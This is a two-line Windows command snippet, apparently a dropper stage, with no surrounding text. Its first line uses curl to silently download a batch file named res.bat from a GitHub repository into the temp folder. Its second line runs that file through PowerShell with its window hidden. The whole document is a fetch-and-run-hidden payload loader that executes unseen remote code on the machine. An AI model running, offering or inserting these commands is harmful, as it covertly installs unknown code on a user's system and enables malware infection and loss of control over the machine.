curl -s -L -o %TEMP%\res.bat https://github.com/d1ovu/pon/raw/refs/heads/main/res.bat
powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\res.bat' -WindowStyle Hidden"
